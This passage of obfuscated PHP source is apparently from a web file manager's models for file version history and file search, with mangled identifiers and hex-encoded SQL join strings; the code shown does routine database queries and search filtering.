$×»¹²ø[2239] => count($™¹ÙÎŠ÷[$×»¹²ø[447]])); } return $™¹ÙÎŠ÷; } protected function _listAppendUser(&$Ú´«‚ù) { $µıƒœ„ı =& $_SERVER[ÔÕ±ĞšÎ]; $×£¡Ğøî = array_to_keyvalue($Ú´«‚ù, $µıƒœ„ı[12], $µıƒœ„ı[1777]); $ª­Ù× = Model($µıƒœ„ı[599])->userListInfo($×£¡Ğøî); foreach ($Ú´«‚ù as &$ß¯Ş£Ë¢) { $ºÆÊıÌÖ = $ß¯Ş£Ë¢[$µıƒœ„ı[1777]]; $ß¯Ş£Ë¢[$µıƒœ„ı[529]] = $ª­Ù×[$ºÆÊıÌÖ] ? $ª­Ù×[$ºÆÊıÌÖ] : !1; } unset($ß¯Ş£Ë¢); } public function fileInfo($±Û²•ê‚) { $ÙÁ›†‘ =& $_SERVER[ÔÕ±ĞšÎ]; $ûôñÖê² = $this->tablePrefix; $Ù†ùÕ§È = "{$ûôñÖê²}\151\157\137\x66\151\154\145\40\146\151\x6c\x65\163\x20\x6f\x6e\40\x66\151\154\x65\x73\56\146\151\x6c\145\x49\104\40\x3d\x20\x68\x69\163\x74\157\x72\x79\x2e\x66\x69\x6c\145\x49\104"; return $this->alias($ÙÁ›†‘[2240])->where(array($ÙÁ›†‘[495] => $±Û²•ê‚))->join($Ù†ùÕ§È, $ÙÁ›†‘[2241])->find(); } public function removeItem($”‚é¹õ) { $ß¬ƒ™õ =& $_SERVER[ÔÕ±ĞšÎ]; $’Ù—ê‘û = array($ß¬ƒ™õ[495] => $”‚é¹õ); $ÊŠÔÖœ³ = $this->where($’Ù—ê‘û)->find(); if ($ÊŠÔÖœ³) { $úïš¶²’ = $this->where($’Ù—ê‘û)->delete(); Model($ß¬ƒ™õ[546])->remove($ÊŠÔÖœ³[$ß¬ƒ™õ[543]]); return $úïš¶²’; } return !1; } public function removeBySource($Ê§¢‹Åø) { $”ÎûŸË´ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Ê§¢‹Åø) { return !1; } if (!is_array($Ê§¢‹Åø)) { $Ê§¢‹Åø = array($Ê§¢‹Åø); } $‹À£ıÀ = array($”ÎûŸË´[493] => array($”ÎûŸË´[7], $Ê§¢‹Åø)); $ò‚£úİ‡ = $this->field($”ÎûŸË´[544])->where($‹À£ıÀ)->select(); if ($ò‚£úİ‡) { $this->where($‹À£ıÀ)->delete(); $€Şó‚Ş = array_to_keyvalue($ò‚£úİ‡, $”ÎûŸË´[12], $”ÎûŸË´[543]); Model($”ÎûŸË´[546])->remove($€Şó‚Ş); } return !0; } public function setDetail($›ˆÊ”øâ, $›şäğ) { $¾„Ö‡»¬ =& $_SERVER[ÔÕ±ĞšÎ]; return $this->where(array($¾„Ö‡»¬[495] => $›ˆÊ”øâ))->save(array($¾„Ö‡»¬[2231] => $›şäğ)); } public function rollbackToItem($”¸˜ØÔ, $ˆüÁ¤î¾) { $¤Ëõ„´É =& $_SERVER[ÔÕ±ĞšÎ]; $±ÄÎ¤¦ï = Model($¤Ëõ„´É[899])->sourceInfo($”¸˜ØÔ); $this->addHistory($±ÄÎ¤¦ï, LNG($¤Ëõ„´É[2242])); $ì¬¤Â©– = $this->find($ˆüÁ¤î¾); $¶ÊŒçî‹ = array($¤Ëõ„´É[543] => $ì¬¤Â©–[$¤Ëõ„´É[543]], $¤Ëõ„´É[79] => $ì¬¤Â©–[$¤Ëõ„´É[79]], $¤Ëõ„´É[88] => time(), $¤Ëõ„´É[531] => USER_ID); Model($¤Ëõ„´É[899])->where(array($¤Ëõ„´É[193] => $”¸˜ØÔ))->save($¶ÊŒçî‹); return $this->where(array($¤Ëõ„´É[495] => $ˆüÁ¤î¾))->delete(); } public function clearSame($“¶½‡Ì‘) { $Ö›õ´°Ì =& $_SERVER[ÔÕ±ĞšÎ]; $Ìğ « Ô = $this->listData($“¶½‡Ì‘); $å£Ÿç©» = array_to_keyvalue_group($Ìğ « Ô, $Ö›õ´°Ì[543]); $¿¡èŞÁ = array(); $ÕıÜ€ü = array(); foreach ($å£Ÿç©» as $Ö‹Ã‡¶Ğ) { if (!$Ö‹Ã‡¶Ğ || count($Ö‹Ã‡¶Ğ) <= 1) { continue; } foreach ($Ö‹Ã‡¶Ğ as $İ­ÆşÔï) { $¿¡èŞÁ[] = $İ­ÆşÔï[$Ö›õ´°Ì[543]]; $ÕıÜ€ü[] = $İ­ÆşÔï[$Ö›õ´°Ì[477]]; } } if (!$ÕıÜ€ü) { return; } $this->where(array($Ö›õ´°Ì[477] => array($Ö›õ´°Ì[7], $ÕıÜ€ü)))->delete(); Model($Ö›õ´°Ì[546])->remove($¿¡èŞÁ); } public function userSpace() { $ª»©‹é¦ =& $_SERVER[ÔÕ±ĞšÎ]; $»½áçÅß = $this->tablePrefix; $’ïç›¼¥ = array($ª»©‹é¦[1768] => USER_ID); $Ô¬¡¥·â = "{$»½áçÅß}\151\157\x5f\x66\151\x6c\145\x20\146\x69\154\x65\x73\x20\157\x6e\x20\x66\x69\x6c\x65\163\x2e\x66\151\x6c\145\x49\x44\40\75\x20\x68\x69\163\164\157\x72\171\x2e\146\151\154\145\111\x44"; return $this->alias($ª»©‹é¦[2240])->where($’ïç›¼¥)->join($Ô¬¡¥·â, $ª»©‹é¦[2241])->sum($ª»©‹é¦[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($€Ê°Ó„ó) { $††ŒËÇø =& $_SERVER[ÔÕ±ĞšÎ]; $³ô÷Ÿ–ã = KodIO::fileTypeList(); $€¼ñ˜ = $³ô÷Ÿ–ã[$€Ê°Ó„ó]; if (!$€¼ñ˜) { return array(); } $¸ï ‡Å­ = $€¼ñ˜[$††ŒËÇø[169]]; $äÁÀó§Ô = $††ŒËÇø[7]; if (!$€¼ñ˜[$††ŒËÇø[169]]) { $õÕÇ¨‚• = array_to_keyvalue($³ô÷Ÿ–ã, $††ŒËÇø[12], $††ŒËÇø[169]); $¸ï ‡Å­ = implode($††ŒËÇø[50], $õÕÇ¨‚•); $äÁÀó§Ô = $††ŒËÇø[2243]; } $ÙĞÚì¬ä = explode($††ŒËÇø[50], trim($¸ï ‡Å­, $††ŒËÇø[50])); return array($äÁÀó§Ô, $ÙĞÚì¬ä); } public function listPathType($¼«öşÍ) { $¯ëÙ×€œ =& $_SERVER[ÔÕ±ĞšÎ]; $Øİ¥ä§„ = $this->fileTypeWhere($¼«öşÍ); if (!$Øİ¥ä§„) { return array(); } $«¹¾– = USER_ID; $‡ğ ²ô‰ = Model($¯ëÙ×€œ[599])->getInfo($«¹¾–); $Şó¡¦õá = array($¯ëÙ×€œ[653] => SourceModel::TYPE_USER, $¯ëÙ×€œ[586] => array($¯ëÙ×€œ[617], $¯ëÙ×€œ[595] . $‡ğ ²ô‰[$¯ëÙ×€œ[90]][$¯ëÙ×€œ[193]] . $¯ëÙ×€œ[618]), $¯ëÙ×€œ[654] => $«¹¾–, $¯ëÙ×€œ[651] => 0, $¯ëÙ×€œ[652] => $Øİ¥ä§„); return $this->listSource($Şó¡¦õá); } public function listSearch($Íƒç¸¥ğ, $ÍáÚ‰‘• = 300) { $—ÔŠ†Ÿ =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($Íƒç¸¥ğ[$—ÔŠ†Ÿ[2077]]) && $Íƒç¸¥ğ[$—ÔŠ†Ÿ[2077]]) { $Íƒç¸¥ğ[$—ÔŠ†Ÿ[2077]] = str_replace($—ÔŠ†Ÿ[462], $—ÔŠ†Ÿ[2244], trim($Íƒç¸¥ğ[$—ÔŠ†Ÿ[2077]])); } $³îéŒ = $this->_parseSearchWhere($Íƒç¸¥ğ); if (!isset($³îéŒ[$—ÔŠ†Ÿ[507]])) { $³îéŒ[$—ÔŠ†Ÿ[507]] = 0; } $›ñ÷™ø = $—ÔŠ†Ÿ[2245]; $çñ·Äªî = $³îéŒ; $¹¦¨ìğÆ = $›ñ÷™ø; $this->_listSearchBindPinyin($Íƒç¸¥ğ, $³îéŒ, $›ñ÷™ø); $this->alias($—ÔŠ†Ÿ[521])->_makeOrder(); $³îéŒ = $this->parseWhereLike($³îéŒ); $ÉÇªğ† = $this->distinct(!0)->field($›ñ÷™ø)->where($³îéŒ)->selectPage($ÍáÚ‰‘•); if ($GLOBALS[$—ÔŠ†Ÿ[6]][$—ÔŠ†Ÿ[459]][$—ÔŠ†Ÿ[460]] && Input::check($Íƒç¸¥ğ[$—ÔŠ†Ÿ[2077]], $—ÔŠ†Ÿ[660]) && $ÉÇªğ†[$—ÔŠ†Ÿ[444]][$—ÔŠ†Ÿ[430]] == 1 && $ÉÇªğ†[$—ÔŠ†Ÿ[444]][$—ÔŠ†Ÿ[445]] == 0) { $ÉÇªğ† = $this->distinct(!0)->field($›ñ÷™ø)->where($çñ·Äªî)->limit(1000)->select(); $ÉÇªğ† = array_page_split($ÉÇªğ†, !1, $ÍáÚ‰‘•); } $this->_listSearchFileContent($ÉÇªğ†, $Íƒç¸¥ğ, $¹¦¨ìğÆ, $çñ·Äªî); $this->_listSearchDesc($ÉÇªğ†, $Íƒç¸¥ğ, $¹¦¨ìğÆ); $this->_listSearchTag($ÉÇªğ†, $Íƒç¸¥ğ, $¹¦¨ìğÆ); $this->_listSearchGroupTag($ÉÇªğ†, $Íƒç¸¥ğ, $¹¦¨ìğÆ); $this->_listDataApply($ÉÇªğ†[$—ÔŠ†Ÿ[447]]); $this->_listMake($ÉÇªğ†); return $ÉÇªğ†; } private function _listSearchFileContent(&$ÁÚ¢ıì¿, $Ş—ë”ßë, $ÜÆì»‡, $ïŠ¥¥Æƒ) { $ş°«­÷ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Ş—ë”ßë[$ş°«­÷[2077]] || $ÁÚ¢ıì¿[$ş°«­÷[444]][$ş°«­÷[430]] > 1) { return; } if (!isset($ïŠ¥¥Æƒ[$ş°«­÷[32]]) || !is_array($Ş—ë”ßë[$ş°«­÷[543]])) { return; } $ïŠ¥¥Æƒ[$ş°«­÷[543]] = array($ş°«­÷[7], $Ş—ë”ßë[$ş°«­÷[543]]); unset($ïŠ¥¥Æƒ[$ş°«­÷[32]]); unset($Ş—ë”ßë[$ş°«­÷[543]]); $Öï¡³ŞÁ = $this->field($ÜÆì»‡)->where($ïŠ¥¥Æƒ)->limit($ş°«­÷[2246])->select(); if (!$Öï¡³ŞÁ || count($Öï¡³ŞÁ) == 0) { return; } $ÁÚ¢ıì¿[$ş°«­÷[447]] = array_merge($Öï¡³ŞÁ, $ÁÚ¢ıì¿[$ş°«­÷[447]]); $ÁÚ¢ıì¿[$ş°«­÷[444]][$ş°«­÷[445]] += count($Öï¡³ŞÁ); } private function _listSearchTag(&$ü’àïÅñ, $®»Á‹‚Á, $èç¡´ª) { $Ã­øÁ†í =& $_SERVER[ÔÕ±ĞšÎ]; if (!$®»Á‹‚Á[$Ã­øÁ†í[2077]] || $ü’àïÅñ[$Ã­øÁ†í[444]][$Ã­øÁ†í[430]] > 1) { return; } $¬’»øà = Model($Ã­øÁ†í[2247])->listData(); $øœÒÅá† = array(); $å½ğ¡¾ = $®»Á‹‚Á[$Ã­øÁ†í[2077]]; foreach ($¬’»øà as $ª´íÆİ¹) { $ºÈÛÜÔÑ = $ª´íÆİ¹[$Ã­øÁ†í[32]]; $«·Î™³À = str_replace($Ã­øÁ†í[53], $Ã­øÁ†í[12], Pinyin::get($ºÈÛÜÔÑ)); if (stripos($ºÈÛÜÔÑ, $å½ğ¡¾) !== !1 || stripos($«·Î™³À, $å½ğ¡¾) !== !1) { $øœÒÅá†[] = $ª´íÆİ¹[$Ã­øÁ†í[477]]; } } if (!$øœÒÅá†) { return; } $í’½€¬‹ = array($Ã­øÁ†í[502] => array($Ã­øÁ†í[7], $øœÒÅá†), $Ã­øÁ†í[1777] => USER_ID); $¼”¾¿­û = Model($Ã­øÁ†í[504])->field($Ã­øÁ†í[87])->where($í’½€¬‹)->select(); $¼”¾¿­û = array_to_keyvalue($¼”¾¿­û, $Ã­øÁ†í[12], $Ã­øÁ†í[87]); $ğğŞ§î = array_unique($¼”¾¿­û); $this->_listSearchMerge($ü’àïÅñ, $®»Á‹‚Á, $èç¡´ª, $ğğŞ§î); } private function _listSearchDesc(&$üÑÂ³êÄ, $åÜˆŠ¯ğ, $óôËôÜ¤) { $¶ÜµÛˆš =& $_SERVER[ÔÕ±ĞšÎ]; if (!$åÜˆŠ¯ğ[$¶ÜµÛˆš[2077]] || $üÑÂ³êÄ[$¶ÜµÛˆš[444]][$¶ÜµÛˆš[430]] > 1) { return; } $À‚çŸ = array($¶ÜµÛˆš[97] => $¶ÜµÛˆš[528], $¶ÜµÛˆš[452] => array($¶ÜµÛˆš[461], $¶ÜµÛˆš[2079] . $åÜˆŠ¯ğ[$¶ÜµÛˆš[2077]] . $¶ÜµÛˆš[2079])); $ªÓêÚü = !1; if ($ªÓêÚü) { $üó‰æÎÇ = $this->listSearchChildren($åÜˆŠ¯ğ[$¶ÜµÛˆš[192]]); $üó‰æÎÇ = array_unique($üó‰æÎÇ); if (!$üó‰æÎÇ) { return; } $À‚çŸ[$¶ÜµÛˆš[193]] = array($¶ÜµÛˆš[7], $üó‰æÎÇ); } $ñæÁ¤¶Ô = Model($¶ÜµÛˆš[637])->field($¶ÜµÛˆš[193])->where($À‚çŸ)->limit(5000)->select(); $˜³ğÌş‹ = array_to_keyvalue($ñæÁ¤¶Ô, $¶ÜµÛˆš[12], $¶ÜµÛˆš[193]); $this->_listSearchMerge($üÑÂ³êÄ, $åÜˆŠ¯ğ, $óôËôÜ¤, $˜³ğÌş‹); } private function _listSearchGroupTag(&$Ì·«¹–Ä, $øœ‘Ç¤Ã, $¶ÖõùÒ§) { $†÷õ­Œñ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$øœ‘Ç¤Ã[$†÷õ­Œñ[2077]] || $Ì·«¹–Ä[$†÷õ­Œñ[444]][$†÷õ­Œñ[430]] > 1 || !$øœ‘Ç¤Ã[$†÷õ­Œñ[192]]) { return; } $¸ÎÌå±² = $this->sourceInfo($øœ‘Ç¤Ã[$†÷õ­Œñ[192]]); if (!$¸ÎÌå±² || $¸ÎÌå±²[$†÷õ­Œñ[190]] != SourceModel::TYPE_GROUP) { return; } $¤£ˆ‰˜ğ = $¸ÎÌå±²[$†÷õ­Œñ[571]]; $¿ÊüÒï = Model($†÷õ­Œñ[2248])->get($¤£ˆ‰˜ğ); $é÷ê‰óŠ = array(); $ì±’®ªÊ = $øœ‘Ç¤Ã[$†÷õ­Œñ[2077]]; foreach ($¿ÊüÒï[$†÷õ­Œñ[447]] as $¹Û¦é¦ù) { $Ë¹…†ã‰ = $¹Û¦é¦ù[$†÷õ­Œñ[32]]; $ïÕİğ„Ì = str_replace($†÷õ­Œñ[53], $†÷õ­Œñ[12], Pinyin::get($Ë¹…†ã‰)); if (stripos($Ë¹…†ã‰, $ì±’®ªÊ) !== !1 || stripos($ïÕİğ„Ì, $ì±’®ªÊ) !== !1) { $é÷ê‰óŠ[] = $¹Û¦é¦ù[$†÷õ­Œñ[477]]; } } if (!$é÷ê‰óŠ) { return; } $„Áöˆ­¿ = array($†÷õ­Œñ[502] => array($†÷õ­Œñ[7], $é÷ê‰óŠ), $†÷õ­Œñ[1777] => 0, $†÷õ­Œñ[33] => $†÷õ­Œñ[2099] . $¤£ˆ‰˜ğ); $±á‚‚û = Model($†÷õ­Œñ[504])->field($†÷õ­Œñ[87])->where($„Áöˆ­¿)->select(); $±á‚‚û = array_to_keyvalue($±á‚‚û, $†÷õ­Œñ[12], $†÷õ­Œñ[87]); $”ÓÁ—ò = array_unique($±á‚‚û); $this->_listSearchMerge($Ì·«¹–Ä, $øœ‘Ç¤Ã, $¶ÖõùÒ§, $”ÓÁ—ò); } private function _listSearchMerge(&$©ë²¼éÂ, $Åß°í¼Á, $Ì ªÛ, $È½æá¾÷) { $«£Ì¿ßë =& $_SERVER[ÔÕ±ĞšÎ]; if (!$È½æá¾÷) { return; } $Ø«”›À˜ = array_to_keyvalue($©ë²¼éÂ[$«£Ì¿ßë[447]], $«£Ì¿ßë[12], $«£Ì¿ßë[193]); $¹ÍÕÍÒ = array_diff($È½æá¾÷, $Ø«”›À˜); if (!$¹ÍÕÍÒ) { return; } $Ï¿üªëï = array($«£Ì¿ßë[193] => array($«£Ì¿ßë[7], $¹ÍÕÍÒ)); $“õÁÒªà = $this->field($Ì ªÛ)->where($Ï¿üªëï)->select(); if (!$“õÁÒªà) { return; } $¬óÑ¬×Ø = array(); foreach ($“õÁÒªà as $ÈéòŒÓÛ) { if ($this->_listSearchFilter($ÈéòŒÓÛ, $Åß°í¼Á)) { $¬óÑ¬×Ø[] = $ÈéòŒÓÛ; } } $©ë²¼éÂ[$«£Ì¿ßë[447]] = array_merge($¬óÑ¬×Ø, $©ë²¼éÂ[$«£Ì¿ßë[447]]); $©ë²¼éÂ[$«£Ì¿ßë[444]][$«£Ì¿ßë[445]] += count($¬óÑ¬×Ø); } private function _listSearchFilter($ôá‡¤Í‰, $˜Œø½À) { $„ƒ‘ê² =& $_SERVER[ÔÕ±ĞšÎ]; $Òš·¿÷ = $ôá‡¤Í‰[$„ƒ‘ê²[487]] == $„ƒ‘ê²[91]; if (!strstr($ôá‡¤Í‰[$„ƒ‘ê²[586]], $„ƒ‘ê²[50] . $˜Œø½À[$„ƒ‘ê²[192]] . $„ƒ‘ê²[50])) { return !1; } if (isset($˜Œø½À[$„ƒ‘ê²[488]]) && $˜Œø½À[$„ƒ‘ê²[488]] != $„ƒ‘ê²[850]) { if ($˜Œø½À[$„ƒ‘ê²[488]] == $„ƒ‘ê²[78] && !$Òš·¿÷) { return !1; } if ($˜Œø½À[$„ƒ‘ê²[488]] != $„ƒ‘ê²[78] && $Òš·¿÷) { return !1; } if (!strstr($ôá‡¤Í‰[$„ƒ‘ê²[169]], $„ƒ‘ê²[50] . $˜Œø½À[$„ƒ‘ê²[488]] . $„ƒ‘ê²[50])) { return !1; } } if (isset($˜Œø½À[$„ƒ‘ê²[2249]]) && $˜Œø½À[$„ƒ‘ê²[2249]] < $ôá‡¤Í‰[$„ƒ‘ê²[79]]) { return !1; } if (isset($˜Œø½À[$„ƒ‘ê²[2250]]) && $˜Œø½À[$„ƒ‘ê²[2250]] > $ôá‡¤Í‰[$„ƒ‘ê²[79]]) { return !1; } if (isset($˜Œø½À[$„ƒ‘ê²[667]]) && $˜Œø½À[$„ƒ‘ê²[667]] != $ôá‡¤Í‰[$„ƒ‘ê²[531]]) { return !1; } return !0; } public function listSearchChildren($æ©ö·§£, $‹Õ­Ÿ„ = 5000) { $±èØ¼ê =& $_SERVER[ÔÕ±ĞšÎ]; $³Ûªä†ñ = array(); $ºÉ°ê´„ = $this->sourceInfo($æ©ö·§£); $×²à¨¾‚ = array($±èØ¼ê[586] => array($±èØ¼ê[461], $ºÉ°ê´„[$±èØ¼ê[586]] . $ºÉ°ê´„[$±èØ¼ê[193]] . $±èØ¼ê[618])); $Ê¨ËÈç­ = $this->field($±èØ¼ê[79])->where($×²à¨¾‚)->limit($‹Õ­Ÿ„ + 1)->select(); $ñ£­á‰„ = is_array($Ê¨ËÈç­) ? count($Ê¨ËÈç­) : 0; if ($ñ£­á‰„ > $‹Õ­Ÿ„) { return $this->_listSearchChildrenNear($æ©ö·§£, $‹Õ­Ÿ„); } $âÍ¿à«á = $this->field($±èØ¼ê[193])->where($×²à¨¾‚)->select(); $³Ûªä†ñ = array_to_keyvalue($âÍ¿à«á, $±èØ¼ê[12], $±èØ¼ê[193]); return $³Ûªä†ñ; } private function _listSearchChildrenNear($ÍµŠÛû÷, $Ö‡¼ËäÇ) { $Ø³å– =& $_SERVER[ÔÕ±ĞšÎ]; $ª½Ç = array(); $å­Õ¬İ = array($Ø³å–[192] => $ÍµŠÛû÷); $Ñø°ë¨ = $this->field($Ø³å–[2251])->where($å­Õ¬İ)->select(); $ŞÖ½Ï•Â = array_to_keyvalue(array_filter_by_field($Ñø°ë¨, $Ø³å–[487], $Ø³å–[91]), $Ø³å–[12], $Ø³å–[193]); $ª½Ç = array_merge($ª½Ç, array_to_keyvalue($Ñø°ë¨, $Ø³å–[12], $Ø³å–[193])); if (!$ŞÖ½Ï•Â) { return $ª½Ç; } $å­Õ¬İ = array($Ø³å–[192] => array($Ø³å–[7], $ŞÖ½Ï•Â)); $Ñø°ë¨ = $this->field($Ø³å–[2251])->where($å­Õ¬İ)->limit($Ö‡¼ËäÇ)->select(); $ª½Ç = array_merge($ª½Ç, array_to_keyvalue($Ñø°ë¨, $Ø³å–[12], $Ø³å–[193])); $ª½Ç = array_slice($ª½Ç, 0, intval($Ö‡¼ËäÇ)); return $ª½Ç; } private function _listSearchBindPinyin($Áã´À”, &$¹¼¤¡’ì, &$Ñ’ÜÃÊ) { $Ó†”ôÉÏ =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($Áã´À”[$Ó†”ôÉÏ[2077]]) || !$Áã´À”[$Ó†”ôÉÏ[2077]]) { return; } if (!Input::check($Áã´À”[$Ó†”ôÉÏ[2077]], $Ó†”ôÉÏ[395]) || strlen($Áã´À”[$Ó†”ôÉÏ[2077]]) < 2) { return; } $éŞàüè½ = "\114\105\x46\x54\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x69\157\137\x73\x6f\x75\162\143\x65\137\155\x65\164\x61\x20\155\x65\x74\x61\40\x6f\x6e\x20\163\157\165\x72\x63\x65\x2e\163\157\165\x72\143\x65\111\x44\x20\75\x20\x6d\145\x74\141\x2e\x73\157\x75\162\x63\145\111\x44"; $éíãÇíœ = array(); $Ñ’ÜÃÊ = str_replace(array($Ó†”ôÉÏ[287], $Ó†”ôÉÏ[53], $Ó†”ôÉÏ[2252]), $Ó†”ôÉÏ[12], $Ñ’ÜÃÊ); $Ñ’ÜÃÊ = $Ó†”ôÉÏ[513] . str_replace($Ó†”ôÉÏ[50], $Ó†”ôÉÏ[514], $Ñ’ÜÃÊ); $±ƒ•ùÆ© = $¹¼¤¡’ì[$Ó†”ôÉÏ[32]]; unset($¹¼¤¡’ì[$Ó†”ôÉÏ[32]]); foreach ($¹¼¤¡’ì as $ûÎ¹œ×Ÿ => $õƒøÏ“Î) { $éíãÇíœ[$Ó†”ôÉÏ[513] . $ûÎ¹œ×Ÿ] = $õƒøÏ“Î; } foreach ($±ƒ•ùÆ© as $ôÖí¿µï) { $éíãÇíœ[] = array($Ó†”ôÉÏ[518] => $ôÖí¿µï, $Ó†”ôÉÏ[1079] => $Ó†”ôÉÏ[2081], array($Ó†”ôÉÏ[2253] => $ôÖí¿µï, $Ó†”ôÉÏ[2254] => array($Ó†”ôÉÏ[7], array($Ó†”ôÉÏ[540], $Ó†”ôÉÏ[539])))); } $this->join($éŞàüè½); $¹¼¤¡’ì = $éíãÇíœ; } private function _parseSearchWhere($Úƒ¥ä’) { $’ƒ‹…µ¼ =& $_SERVER[ÔÕ±ĞšÎ]; $êˆ÷˜Ò€ = array(); if (isset($Úƒ¥ä’[$’ƒ‹…µ¼[834]]) && $Úƒ¥ä’[$’ƒ‹…µ¼[834]]) { $êˆ÷˜Ò€[$’ƒ‹…µ¼[88]] = array($’ƒ‹…µ¼[2255], $Úƒ¥ä’[$’ƒ‹…µ¼[834]]); } if (isset($Úƒ¥ä’[$’ƒ‹…µ¼[835]]) && $Úƒ¥ä’[$’ƒ‹…µ¼[835]]) { $¦˜ÈãÈì = array($’ƒ‹…µ¼[2256], $Úƒ¥ä’[$’ƒ‹…µ¼[835]]); if ($êˆ÷˜Ò€[$’ƒ‹…µ¼[88]]) { $êˆ÷˜Ò€[$’ƒ‹…µ¼[88]] = array($êˆ÷˜Ò€[$’ƒ‹…µ¼[88]], $¦˜ÈãÈì, $’ƒ‹…µ¼[2257]); } else { $êˆ÷˜Ò€[$’ƒ‹…µ¼[88]] = $¦˜ÈãÈì; } } if (isset($Úƒ¥ä’[$’ƒ‹…µ¼[2249]]) && $Úƒ¥ä’[$’ƒ‹…µ¼[2249]] > 0) { $êˆ÷˜Ò€[$’ƒ‹…µ¼[79]] = array($’ƒ‹…µ¼[2255], $Úƒ¥ä’[$’ƒ‹…µ¼[2249]]); } if (isset($Úƒ¥ä’[$’ƒ‹…µ¼[2250]]) && $Úƒ¥ä’[$’ƒ‹…µ¼[2250]]) { $¦˜ÈãÈì = array($’ƒ‹…µ¼[2256], $Úƒ¥ä’[$’ƒ‹…µ¼[2250]]); if ($êˆ÷˜Ò€[$’ƒ‹…µ¼[79]]) { $êˆ÷˜Ò€[$’ƒ‹…µ¼[79]] = array($êˆ÷˜Ò€[$’ƒ‹…µ¼[79]], $¦˜ÈãÈì, $’ƒ‹…µ¼[2257]); } else { $êˆ÷˜Ò€[$’ƒ‹…µ¼[79]] = $¦˜ÈãÈì; } } if (isset($Úƒ¥ä’[$’ƒ‹…µ¼[667]]) && $Úƒ¥ä’[$’ƒ‹…µ¼[667]]) { $êˆ÷˜Ò€[] = array($’ƒ‹…µ¼[531] => $Úƒ¥ä’[$’ƒ‹…µ¼[667]], $’ƒ‹…µ¼[529] => $Úƒ¥ä’[$’ƒ‹…µ¼[667]], $’ƒ‹…µ¼[1079] => $’ƒ‹…µ¼[2081]); } if (isset($Úƒ¥ä’[$’ƒ‹…µ¼[488]]) && $Úƒ¥ä’[$’ƒ‹…µ¼[488]]) { $å‘˜«ŒÙ = $Úƒ¥ä’[$’ƒ‹…µ¼[488]]; if ($å‘˜«ŒÙ == $’ƒ‹…µ¼[78]) { $êˆ÷˜Ò€[$’ƒ‹…µ¼[487]] = 1; } else { if ($å‘˜«ŒÙ == $’ƒ‹…µ¼[2258]) { $êˆ÷˜Ò€[$’ƒ‹…µ¼[487]] = 0; } else { if ($å‘˜«ŒÙ) { $å‘˜«ŒÙ = is_array($å‘˜«ŒÙ) ? $å‘˜«ŒÙ : explode($’ƒ‹…µ¼[50], $å‘˜«ŒÙ); $êˆ÷˜Ò€[$’ƒ‹…µ¼[488]] = array($’ƒ‹…µ¼[494], $å‘˜«ŒÙ); $êˆ÷˜Ò€[$’ƒ‹…µ¼[487]] = 0; } } } } $this->_parseSearchParent($Úƒ¥ä’, $êˆ÷˜Ò€); if (isset($Úƒ¥ä’[$’ƒ‹…µ¼[2077]]) && trim($Úƒ¥ä’[$’ƒ‹…µ¼[2077]])) { $¡¶Ú¥Ää = trim($Úƒ¥ä’[$’ƒ‹…µ¼[2077]]); $¬øÛÉÙÖ = explode($’ƒ‹…µ¼[53], $¡¶Ú¥Ää); if (strlen($¡¶Ú¥Ää) > 2 && (substr($¡¶Ú¥Ää, 0, 1) == $’ƒ‹…µ¼[121] && substr($¡¶Ú¥Ää, -1) == $’ƒ‹…µ¼[121]) || substr($¡¶Ú¥Ää, 0, 1) == $’ƒ‹…µ¼[58] && substr($¡¶Ú¥Ää, -1) == $’ƒ‹…µ¼[58]) { $¡¶Ú¥Ää = substr($¡¶Ú¥Ää, 1, -1); $¬øÛÉÙÖ = array($¡¶Ú¥Ää); } $êˆ÷˜Ò€[$’ƒ‹…µ¼[32]] = array(array($’ƒ‹…µ¼[617], $’ƒ‹…µ¼[2079] . $¡¶Ú¥Ää . $’ƒ‹…µ¼[2079])); if (count($¬øÛÉÙÖ) > 1) { $êˆ÷˜Ò€[$’ƒ‹…µ¼[32]] = array(); foreach ($¬øÛÉÙÖ as $Î¯¾Ô‚“) { if (!trim($Î¯¾Ô‚“)) { continue; } $êˆ÷˜Ò€[$’ƒ‹…µ¼[32]][] = array($’ƒ‹…µ¼[617], $’ƒ‹…µ¼[2079] . trim($Î¯¾Ô‚“) . $’ƒ‹…µ¼[2079]); } } } return $êˆ÷˜Ò€; } private function _parseSearchParent($Ç™ïˆà¢, &$ÊùÏĞåÆ) { $á¤Õˆ‘” =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($Ç™ïˆà¢[$á¤Õˆ‘”[192]]) || !$Ç™ïˆà¢[$á¤Õˆ‘”[192]]) { return; } $í¿ˆ ‡ï = $this->pathInfo($Ç™ïˆà¢[$á¤Õˆ‘”[192]]); $½ÙÜ¯«È = $í¿ˆ ‡ï[$á¤Õˆ‘”[192]] . $á¤Õˆ‘”[12] === $á¤Õˆ‘”[230]; $¡ßêıŞ° = $í¿ˆ ‡ï[$á¤Õˆ‘”[190]] == $á¤Õˆ‘”[580]; if ($í¿ˆ ‡ï[$á¤Õˆ‘”[596]] == $á¤Õˆ‘”[597]) { $ÊÎ€¦±§ = $this->sourceInfo($Ç™ïˆà¢[$á¤Õˆ‘”[192]]); $í¿ˆ ‡ï[$á¤Õˆ‘”[586]] = $ÊÎ€¦±§[$á¤Õˆ‘”[586]]; } $ÊùÏĞåÆ[$á¤Õˆ‘”[657]] = array($á¤Õˆ‘”[617], $í¿ˆ ‡ï[$á¤Õˆ‘”[586]] . $Ç™ïˆà¢[$á¤Õˆ‘”[192]] . $á¤Õˆ‘”[618]); $¡ëÛÈùó = isset($Ç™ïˆà¢[$á¤Õˆ‘”[1936]]) && in_array($á¤Õˆ‘”[580], $Ç™ïˆà¢[$á¤Õˆ‘”[1936]]); if (!$¡ëÛÈùó || !$¡ßêıŞ° || !$½ÙÜ¯«È || !$í¿ˆ ‡ï[$á¤Õˆ‘”[489]]) { return; } if (!AuthModel::authCheckRoot($í¿ˆ ‡ï[$á¤Õˆ‘”[489]][$á¤Õˆ‘”[490]])) { return; } $²ùÊáçÒ = $í¿ˆ ‡ï[$á¤Õˆ‘”[571]] . $á¤Õˆ‘”[12]; if ($²ùÊáçÒ == $á¤Õˆ‘”[91]) { unset($ÊùÏĞåÆ[$á¤Õˆ‘”[657]]); $ÊùÏĞåÆ[$á¤Õˆ‘”[190]] = self::TYPE_GROUP; return; } $ìÎİÌé = 